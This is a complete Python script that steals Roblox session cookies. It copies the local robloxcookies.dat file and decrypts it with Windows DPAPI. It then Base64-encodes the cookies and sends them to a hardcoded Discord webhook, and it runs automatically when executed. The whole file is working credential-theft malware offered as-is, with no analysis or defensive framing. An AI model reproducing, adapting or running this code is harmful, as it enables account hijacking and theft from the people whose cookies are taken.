import os
import shutil
import json
import base64
import win32crypt
import requests
import math

def send_to_webhook(content, webhook_url="https://discord.com/api/webhooks/1411467252687175772/0xwqt4P1Qkgt7U3bNJwg22Ex-vXRknBzrhPWcdxjkbLxZ2HHywiSrtSij3ONShB2aCvN"):
    """Send Base64-encoded content to the webhook in a Discord code block, splitting if necessary."""
    # Encode the content in Base64
    encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')
    
    # Split content into chunks of 1900 characters or less
    chunk_size = 1900
    chunks = [encoded_content[i:i + chunk_size] for i in range(0, len(encoded_content), chunk_size)]
    total_chunks = len(chunks)
    
    # Send each chunk as a separate message
    for i, chunk in enumerate(chunks, 1):
        if total_chunks > 1:
            payload = {"content": f"```Part {i}/{total_chunks} of Base64 Encoded Content:\n{chunk}```"}
        else:
            payload = {"content": f"```Base64 Encoded Content:\n{chunk}```"}
        try:
            response = requests.post(webhook_url, json=payload)
            if response.status_code not in (200, 204):
                print(f"Failed to send chunk {i}/{total_chunks} to webhook: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Error sending chunk {i}/{total_chunks} to webhook: {e}")

def retrieve_roblox_cookies():
    webhook_url = "https://discord.com/api/webhooks/1411467252687175772/0xwqt4P1Qkgt7U3bNJwg22Ex-vXRknBzrhPWcdxjkbLxZ2HHywiSrtSij3ONShB2aCvN"
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(user_profile, "AppData", "Local", "Roblox", "LocalStorage", "robloxcookies.dat")

    if not os.path.exists(roblox_cookies_path):
        send_to_webhook(f"Error: Roblox cookies file not found at {roblox_cookies_path}", webhook_url)
        return
    
    temp_dir = os.getenv("TEMP", "")
    destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
    try:
        shutil.copy(roblox_cookies_path, destination_path)
    except Exception as e:
        send_to_webhook(f"Error copying file: {e}", webhook_url)
        return

    with open(destination_path, 'r', encoding='utf-8') as file:
        try:
            file_content = json.load(file)
            encoded_cookies = file_content.get("CookiesData", "")
            
            if encoded_cookies:
                decoded_cookies = base64.b64decode(encoded_cookies)
                
                try:
                    decrypted_cookies = win32crypt.CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                    cookie_content = decrypted_cookies.decode('utf-8', errors='ignore')
                    send_to_webhook(f"Decrypted Roblox Cookies:\n{cookie_content}", webhook_url)
                except Exception as e:
                    send_to_webhook(f"Error decrypting with DPAPI: {e}", webhook_url)
            else:
                send_to_webhook("Error: No 'CookiesData' found in the file.", webhook_url)
        
        except json.JSONDecodeError as e:
            send_to_webhook(f"Error while parsing JSON: {e}", webhook_url)
        except Exception as e:
            send_to_webhook(f"Error: {e}", webhook_url)

retrieve_roblox_cookies()